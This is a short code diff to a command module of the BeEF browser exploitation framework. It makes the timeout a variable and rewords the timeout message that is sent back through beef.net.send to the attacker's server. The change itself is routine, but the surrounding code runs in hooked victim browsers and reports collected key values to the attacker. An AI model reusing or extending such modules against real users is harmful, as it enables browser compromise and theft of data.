@@ -16,6 +16,7 @@
 beef.execute(function() {
 
 	var internal_counter = 0;
+	var timeout = 30;
 	var result;
 	var key_paths;
 
@@ -39,8 +40,8 @@ beef.execute(function() {
 			return;
 		} catch (e) {
 			internal_counter++;
-			if (internal_counter > 30) {
-				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'key_values=time out');
+			if (internal_counter > timeout) {
+				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'key_values=Timeout after '+timeout+' seconds');
 				return;
 			}
 			setTimeout(function() {waituntilok()},1000);
